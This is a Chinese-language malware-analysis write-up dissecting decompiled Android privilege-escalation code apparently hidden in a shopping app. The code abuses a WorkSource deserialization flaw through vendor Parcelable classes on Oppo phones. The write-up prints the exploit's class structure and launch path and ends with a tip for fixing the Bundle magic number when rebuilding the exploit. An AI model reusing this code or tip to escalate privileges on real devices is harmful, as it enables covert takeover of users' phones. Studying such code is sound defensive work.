 # 某DD提权代码逆向分析

某DD对几大厂商手机的提权代码类似，都是使用了WorkSource的反序列化漏洞，因此，这里以Oppo的提权代码为例，简要分析流程。
## 逻辑梳理
- com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup，该类是oppo机型提权代码所在的类，它继承了com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp，而CommonAlivePullStartUp又依次继承com.xunmeng.pinduoduo.alive.base.ability.impl.provider.oppoLauncher.OppoLauncherProviderImpl、com.xunmeng.pinduoduo.alive.base.ability.interfaces.provider.BaseBizProviderImpl（BaseBizProviderImpl在拼多多主App中实现，可参考version 6.44），BaseBizProviderImpl实现了com.xunmeng.pinduoduo.alive.base.ability.interfaces.provider.IBizProvider：
```java
    package com.xunmeng.pinduoduo.alive.base.ability.interfaces.provider;
    
    public interface IBizProvider {
        boolean hasPermission();
    }
```

    IBizProvider接口类的代码只包含一个方法 hasPermission()。
    
    CommonAlivePullStartUp类中有一部分提权代码，是Android SDK各个level 都要用的，包括31。
    CommonAlivePullStartUp类中有intParcelClzMap()、initFuncMap()方法，initFuncMap()方法是用于构造提权bundle的，提权bundle中存放了类OppoLauncherProviderImpl的对象，该对象应该是OppoLauncherProviderImpl实现了Function接口类之后生成的一个对象：
```java
    public void initFuncMap() {
            this.sFuncMakeBundleMap.put("android.os.WorkSource", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp.1
                public Bundle makeBundle(Intent intent) {
                    return CommonAlivePullStartUp.this.makeBundleForWorkSource(intent);
                }
            });
        }
```  
    各家厂商的提权代码都继承了CommonAlivePullStartUp类，而且实现了自己的intParcelClzMap()、initFuncMap()方法：
```java
    /* JADX INFO: Access modifiers changed from: protected */
        @Override // com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp
        public void intParcelClzMap() {
            List asList = Arrays.asList("com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse", "com.android.internal.telephony.OperatorInfo");
            for (int i = 26; i <= 29; i++) {
                this.sParcelableClzMap.put(Integer.valueOf(i), asList);
            }
            this.sParcelableClzMap.put(30, Arrays.asList("com.oplus.orms.info.OrmsNotifyParam", "com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse"));
            super.intParcelClzMap();
        }
    
    
    /* JADX INFO: Access modifiers changed from: protected */
        @Override // com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp
        public void initFuncMap() {
            super.initFuncMap();
            this.sFuncMakeBundleMap.put("com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup.1
                public Bundle makeBundle(Intent intent) {
                    return OppoAlivePullStartup.this.makeBundleForOppoSinceOToQ(intent, "com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse");
                }
            });
            this.sFuncMakeBundleMap.put("com.android.internal.telephony.OperatorInfo", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup.2
                public Bundle makeBundle(Intent intent) {
                    return OppoAlivePullStartup.this.makeBundleForOppoSinceOToQ(intent, "com.android.internal.telephony.OperatorInfo");
                }
            });
            this.sFuncMakeBundleMap.put("com.oplus.orms.info.OrmsNotifyParam", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup.3
                public Bundle makeBundle(Intent intent) {
                    return OppoAlivePullStartup.this.makeBundleForOppoForR(intent);
                }
            });
        }
```
    
    其中，Function接口类的代码如下：
```java
    package com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup;
    
    import android.content.Intent;
    import android.os.Bundle;
    
    public interface Function {
        Bundle makeBundle(Intent intent);
    }
```   
- 继续往上梳理，AlivePullStartUpImpl 类中有 makeBundle(Intent intent) 方法，该方法是通过 this.mMakeBundleFunction 属性调用其中的 makeBundle(Intent intent) 方法（即 Function 接口类的 makeBundle(Intent intent) 方法，该方法的实现在XXAlivePullStartup类的 initFuncMap() 方法中，它即是传入一个 intent 来写入漏洞提权所用的bundle），这里很关键，上层利用漏洞时应该要调用 AlivePullStartUpImpl 的 makeBundle(Intent intent) 方法来获取一个利用漏洞的bundle：
```java   
    public Bundle makeBundle(Intent intent) {
            if (intent == null) {
                Logger.w("SpecialPullAbility.Comp", "make empty bundle");
                return new Bundle();
            }
            Logger.i("SpecialPullAbility.Comp", "make bundle");
            if (this.mMakeBundleFunction == null) {
                Logger.i("SpecialPullAbility.Comp", "no make bundle function");
                return Bundle.EMPTY;
            }
            Bundle makeBundle = this.mMakeBundleFunction.makeBundle(intent);
            return makeBundle == null ? Bundle.EMPTY : makeBundle;
        }
```    
    
    AlivePullStartUpImpl 类中还有 startAccount(Intent intent) 方法，并通过该方法来调用 realStartAccount(Intent intent) 方法，这两个方法是将构造的反序列化漏洞代码送入AMS，完成提权：
```java
    private boolean realStartAccount(Intent intent) {
            Logger.i("SpecialPullAbility.Comp", "real start accountSettings activity.");
            try {
                BotBaseApplication.getContext().startActivity(intent);
                return true;
            } catch (Exception e) {
                StartPullUpTrack.trackScene("start_account_exception");
                Logger.e("SpecialPullAbility.Comp", e);
                return false;
            }
    }
```  
- 从类 AlivePullStartUpImpl 再往上，就是类：com.xunmeng.pinduoduo.alive.base.ability.comp.Main，这是提权漏洞使用的上层类，在该类中创建一个 AlivePullStartUpImpl 对象，用于完成提权操作：
```java    
    public class Main {
        private static final String TAG = null;
    
        public static IAlivePullStartUp getAlivePullStartUp() {
            Logger.i("LVBA.Plugin.Main", "getAlivePullStartUp");
            return new AlivePullStartUpImpl();
        }
    
        public static IStrategy createStrategyProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createStrategyProxy: " + str);
            return (IStrategy) ComponentContainer.getComponent(str);
        }
    
        public static IAliveBaseAbility getAliveBaseAbility() {
            Logger.i("LVBA.Plugin.Main", "getAliveBaseAbilityInstance");
            return new AliveBaseAbilityImpl();
        }
    
        public static IReceiver createReceiverProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createReceiverProxy: " + str);
            return (IReceiver) ComponentContainer.getComponent(str);
        }
    
        public static IVivoBindServiceComp getLauncherDetectVivoBindService() {
            Logger.i("LVBA.Plugin.Main", "getLauncherDetectVivoBindService");
            return VivoBindService.getInstance();
        }
    
        public static Boolean hasComponent(String str) {
            Logger.i("LVBA.Plugin.Main", "hasComponent: " + str);
            return Boolean.valueOf(ComponentContainer.getComponent(str) != null);
        }
    
        public static IActivity createActivityProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createActivityProxy: " + str);
            return (IActivity) ComponentContainer.getComponent(str);
        }
    
        public static IService createServiceProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createServiceProxy: " + str);
            return (IService) ComponentContainer.getComponent(str);
        }
    
        public static Set getComponentNames() {
            Logger.i("LVBA.Plugin.Main", "getComponentNames");
            return ComponentContainer.getComponentNames();
        }
    
        public static IPluginPAStrategyUtil getIPluginPAStrategyUtil() {
            Logger.i("LVBA.Plugin.Main", "getIPluginPAStrategyUtil");
            return new PluginPAStrategyUtilImpl();
        }
    }
```
## 可能的问题
- 在构造提权的bundle时，可能会报出如下错误：
 ```
 java.lang.IllegalStateException: Bad magic number for Bundle: 0x444e4c42
```
这是由于jadx反编译某DD代码出错，将bundle的magic number搞错了，这里应该改成0x4C444E42即可解决。
#### 声明：此处分析仅供学习参考，严禁违法使用，否则后果由违法使用者自行承担！